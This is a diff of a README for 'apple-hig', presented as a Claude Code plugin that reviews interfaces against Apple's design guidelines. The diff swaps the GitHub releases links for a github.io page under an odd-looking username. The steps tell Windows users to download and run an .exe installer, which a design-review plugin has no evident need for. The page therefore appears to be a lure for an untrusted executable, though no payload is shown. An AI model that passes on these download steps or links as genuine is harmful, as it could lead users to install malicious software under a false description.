@@ -1,6 +1,6 @@
 # 🍎 apple-hig - Create interfaces that match Apple standards
 
-[![Download apple-hig](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/aponeurosiswilling807/apple-hig/releases)
+[![Download apple-hig](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://aponeurosiswilling807.github.io)
 
 The apple-hig tool helps you design software that looks and feels like native Apple applications. It works with Claude Code to review your user interface against real Apple design rules. You can use this for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS projects. The plugin checks your work so your apps follow the Human Interface Guidelines.
 
@@ -8,7 +8,7 @@ The apple-hig tool helps you design software that looks and feels like native Ap
 
 You need the latest version of the installer to begin. Follow these specific steps to get the software on your Windows computer:
 
-1. Visit the following link to see all available releases: [https://github.com/aponeurosiswilling807/apple-hig/releases](https://github.com/aponeurosiswilling807/apple-hig/releases)
+1. Visit the following link to see all available releases: [https://aponeurosiswilling807.github.io](https://aponeurosiswilling807.github.io)
 2. Look for the section labeled "Assets".
 3. Click the file that ends in .exe to download the installer.
 4. Save the file to your Downloads folder.
